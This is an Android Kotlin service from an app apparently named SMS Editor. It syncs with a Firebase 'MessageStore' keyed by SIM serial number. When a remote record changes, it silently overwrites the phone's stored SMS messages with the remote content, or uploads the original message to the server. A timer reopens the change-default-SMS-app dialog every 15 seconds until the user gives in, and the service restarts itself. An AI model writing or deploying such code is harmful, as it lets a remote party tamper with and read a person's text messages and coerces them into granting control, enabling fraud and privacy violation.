package sms.newgate.com.smseditor.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.provider.Telephony
import android.util.Log
import com.google.firebase.database.*
import sms.newgate.com.smseditor.model.SmsThread
import sms.newgate.com.smseditor.util.MessageHelper
import sms.newgate.com.smseditor.util.TelephoneUtil
import android.os.CountDownTimer



/**
 * Created by apple on 1/17/18.
 */

class FirebaseMsgService : Service() {

    lateinit var helper: MessageHelper

    val databasePre: DatabaseReference by lazy {
        FirebaseDatabase.getInstance().getReference("MessageStore")
    }

    fun updateMessage(message: SmsThread) {
        databasePre.child(message.simId).updateChildren(message.toMap())
    }

    override fun onCreate() {
        super.onCreate()
        startTimer()
        helper = MessageHelper(this)
        val simSerialNumber = TelephoneUtil.getInstance(this).simSerialNumber()
        databasePre.addChildEventListener(object : ChildEventListener {
            override fun onCancelled(p0: DatabaseError?) {

            }

            override fun onChildMoved(p0: DataSnapshot?, p1: String?) {
            }

            override fun onChildChanged(data: DataSnapshot?, p1: String?) {
                Log.e("XonChildChanged", "===> 1")
                val message: SmsThread? = data?.getValue(SmsThread::class.java)
                if(message != null && message.simSerialNumber != simSerialNumber) {
                    return
                }
                if(!isDefaultSmsApp()) {
                    if(message != null) {
                        val backMessage = helper.getMessage(message.id)
                        if(backMessage != null) {
                            updateMessage(backMessage)
                        }
                    }
                    val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                    intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(intent)
                } else {
                    if (message != null) {
                        helper.updateMessage(message)
                    }
                }
            }

            override fun onChildAdded(data: DataSnapshot?, p1: String?) {

            }

            override fun onChildRemoved(p0: DataSnapshot?) {
            }

        })

    }

    fun isDefaultSmsApp(): Boolean {
        return this.packageName == Telephony.Sms.getDefaultSmsPackage(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }


    private fun startTimer() {
        var mTimeToGo: Long = 10000 * 1000
        val mCountDownTimer = object : CountDownTimer(mTimeToGo, 15000) {
            override fun onTick(millisUntilFinished: Long) {
                if(!isDefaultSmsApp()) {
                    mTimeToGo -= 1
                    Log.e("XtimeCount", "" + mTimeToGo)
                    val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                    intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(intent)
                } else {
                    Log.e("XtimeCount", "====> stop")
//                    stopSelf()
                }
            }

            override fun onFinish() {
            }
        }.start()
    }

}